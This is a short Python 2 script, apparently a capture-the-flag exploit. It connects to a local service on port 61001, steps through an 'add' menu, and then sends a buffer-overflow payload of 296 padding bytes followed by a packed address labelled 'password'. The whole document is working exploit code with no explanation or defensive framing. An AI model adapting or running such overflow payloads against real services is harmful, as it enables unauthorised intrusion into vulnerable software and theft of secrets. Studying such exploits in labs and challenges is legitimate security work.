from struct import *
from socket import *

p32 = lambda x: pack("<L", x)
password = 0x0804b080
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 61001))

print s.recv(1024)

s.send("add\n")
print s.recv(1024)
s.send("a\n")
print s.recv(1024)
s.send("a\n")
print s.recv(1024)

payload = ""
payload += "a"*296
payload += p32(password)

s.send(payload)
print s.recv(1024)
print s.recv(1024)
